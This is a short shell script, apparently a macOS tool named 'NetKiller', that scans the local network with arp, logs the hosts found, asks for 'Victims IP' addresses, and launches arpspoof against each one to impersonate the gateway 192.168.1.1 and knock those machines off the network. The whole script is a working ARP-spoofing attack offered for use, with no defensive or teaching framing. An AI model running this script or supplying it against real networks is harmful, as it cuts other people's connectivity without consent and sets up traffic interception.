#Check if user is root
if [ "$(id -u)" != "0" ]; then
   echo "This script must be run as root"
   exit 1
fi
clear
script_dir=$(dirname $0)
cd $script_dir
echo ""
echo "                    _   _      _   _  ___ _ _           "
echo "                   | \ | |    | | | |/ (_) | |          "
echo "                   |  \| | ___| |_| ' / _| | | ___ _ __ "
echo "                   | .   |/ _ \ __|  < | | | |/ _ \  __|"
echo "                   | |\  |  __/ |_| . \| | | |  __/ |   "
echo "                   |_| \_|\___|\__|_|\_\_|_|_|\___|_|   "
echo "                   -------------------------------------"
echo '\033[0;34m                        Version 1.0 by ShellBear'
echo ""
echo '\033[0m                        <-- Starting Scanning --> '
echo ""
echo ""
arp -a
echo ""
echo '\033[0;34m'
echo $(date) >> /Library/.netkiller/lognetkiller.txt ; arp -a >> /Library/.netkiller/lognetkiller.txt ; echo >> /Library/.netkiller/lognetkiller.txt
arp -a | grep -o -E '([[:xdigit:]]{1,2}:){5}[[:xdigit:]]{1,2}' | while read line
do
mac=$line
oui=${mac:0:8}
grep -i $oui /Library/.netkiller/macadress.txt 
grep -i $oui /Library/.netkiller/macadress.txt >> /Library/.netkiller/lognetkiller.txt
done
echo ;echo >> /Library/.netkiller/lognetkiller.txt
echo '\033[0m'
echo ""
read -p "Victims IP separated by [ ; ] : " victim
echo ""
echo ""
echo "-----------------------------"
echo '\033[0;34mKilling :'
for i in $(echo $victim | tr ";" "\n")
do
  sudo arpspoof -i en1 -t $i 192.168.1.1 > /dev/null 2>&1 &
  echo "$i"
done
echo '\033[0m-----------------------------'
echo ""
read -rsp $'Press any key to stop..\n' -n1 key
killall arpspoof
echo ""
echo ""


